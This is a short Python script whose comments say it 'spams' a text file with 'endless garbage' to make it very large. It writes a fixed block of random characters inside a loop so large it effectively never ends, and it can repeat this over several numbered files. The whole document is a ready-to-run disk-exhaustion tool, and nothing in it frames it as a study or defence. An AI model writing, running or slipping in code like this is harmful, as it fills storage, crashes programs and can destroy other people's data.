num_file = 0 ## The number used to name the file ##
num_copies = 1 ## Replace with number of copies you want (reccomended 1) ##
while num_copies > 0:
    file = open(f"{num_file}.txt", "w+") ## Opens a file, creates if non-existent ##
    for num_control in range(1, 2**((4096*2)*1000000)):
        file.write(f"""hdhushdhsuhshaulmvkjhjedjkdkjfdskajdhnajKSDXGHFJGRDJKKkdjyuisdcgftcydsufhdgsjh
        ndgshsbvgahdyfjshgdfguijkdghdjksdgsjakdfgdsjakjsdksjdfhdjksfdsfhdsjkdfhsjkdfchyudxrhgyfh
        dhgfcvcdjkfbgfdsjfndhjdfhyhgfuhgsyfhedufyhdjkffudisfjdghfdsyufgtrhjfngdhsyufhyd
        hfudifhyudhfdfdgyhfdydgdfcyuhjdkhyugyugfydjh{num_control}djkffhdsdbsajfhdsnghkhfdsfgh""") ## Spams the file with endless garbage, making the file very large ##
    num_file += 1 ## Increments the file number, ensuring the script functions properly with multiple copies. ##
    num_copies -= 1
    file.close() ## Closes the file because the script is done with it ##
